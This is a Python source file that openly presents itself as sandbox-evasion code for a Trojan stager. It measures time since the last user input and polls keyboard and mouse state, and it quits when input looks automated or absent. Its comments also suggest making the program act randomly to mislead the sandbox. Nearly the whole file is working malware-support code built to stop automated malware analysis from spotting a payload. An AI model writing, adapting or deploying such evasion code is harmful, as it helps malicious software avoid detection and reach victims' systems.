'''
This script employs basic sandbox evasion techniques based on behaviour.

This code can be incorporated into the Trojan not as a module that returns data, but as code that executes as part of the stager itself.
'''

from ctypes import byref, c_uint, c_ulong, sizeof, Structure, windll
import random
import sys
import time
import win32api

class LASTINPUTINFO(Structure):                 # hold the timestamp (in milliseconds) of the last input event on the system
    fields = [
        ('cbSize', c_uint),
        ('dwTime', c_ulong)                     # This is the field that gets populated with the timestamp when GetLastInputInfo() is called.
    ]

def get_last_input():                           # Determine the time of the last input
    struct_lastinputinfo = LASTINPUTINFO()
    struct_lastinputinfo.cbSize = sizeof(LASTINPUTINFO)             # you must initialize cbSize to the size of the structure before calling for the last input even info
    windll.user32.GetLastInputInfo(byref(struct_lastinputinfo))
    run_time = windll.kernel32.GetTickCount()                       # How long has the system been running?
    elapsed = run_time - struct_lastinputinfo.dwTime                # elapsed time = system running time - time of last input event
    print(f"[*] It's been {elapsed} milliseconds since the last event.")
    return elapsed

# while True:
#     get_last_input()
#     time.sleep(1)

class Detector:
    def __init__(self):
        self.double_clicks = 0
        self.keystrokes = 0
        self.mouse_clicks = 0

    def get_key_press(self):                # tally the number of keystrokes, number of mouse clicks, and the time of mouse clicks
        for i in range(0, 0xff):
            state = win32api.GetAsyncKeyState(i)
            if state & 0x0001:                      # this means that the key has been pressed
                if i == 0x1:                        # if the key's value is 0x1, it is a left mouse click
                    self.mouse_clicks += 1          # increment the number of mouse clicks (an attribute of the object)
                    return time.time()              # return the current time so that frequency analysis/timing calculations can be performed
                elif i > 32 and i < 127:            # if the event is an ascii input
                    self.keystrokes += 1            # increment the keystroke tally
        return None
    
    def detect(self):                               # use the attributes (mouse clicks, time of mouse clicks, and number of keystrokes) to detect sandbox environment
        previous_timestamp = None
        first_double_click = None
        double_click_threshold = 0.35               # time within which two clicks can be considered a double click

        max_double_clicks = 10                      # if these criteria are met, we are not in a sandbox
        max_keystrokes = random.randint(10,25)
        max_mouse_clicks = random.randint(5,25)
        max_input_threshold = 30000

        last_input = get_last_input()               # when was the last input to the system? (elapsed time)
        if last_input >= max_input_threshold:
            sys.exit(0)                             # if too much time has passed since the last user input we are decidedly in a sandbox, and the program will stop
                                                    # this threshold should change based on the vector of infection.
                                                    # before quitting, the program could also confuse the sandbox by behaving randomly prior to stopping
        detection_complete = False
        while not detection_complete:
            keypress_time = self.get_key_press()                                # solicit the timestamp of system input, if there are any
            if keypress_time is not None and previous_timestamp is not None:    # if there is input to the system...
                elapsed = keypress_time - previous_timestamp                    # elapsed time since the last input event

                if elapsed <= double_click_threshold:                           # do we have a double click?
                    self.mouse_clicks -= 2
                    self.double_clicks += 1
                    if first_double_click is None:
                        first_double_click = time.time()                        # if this is the first double click, take the timestamp
                    else:
                        if self.double_clicks >= max_double_clicks:             # is the sandbox blasting double clicks?
                            if (keypress_time - first_double_click <= (max_double_clicks*double_click_threshold)):
                                sys.exit(0)             # if the amount of double clicks exceeds the maximum number of double clicks within the double click threshold, stop execution
                if (self.keystrokes >= max_keystrokes and self.double_clicks >= max_double_clicks and self.mouse_clicks >= max_mouse_clicks):
                    detection_complete = True               # if we have been able to detect sufficient amount of system input to make an evaluation, detection phase is complete

                previous_timestamp = keypress_time
            elif keypress_time is not None:
                previous_timestamp = keypress_time

if __name__ == "__main__":
    d = Detector()
    d.detect()
    print('okay.')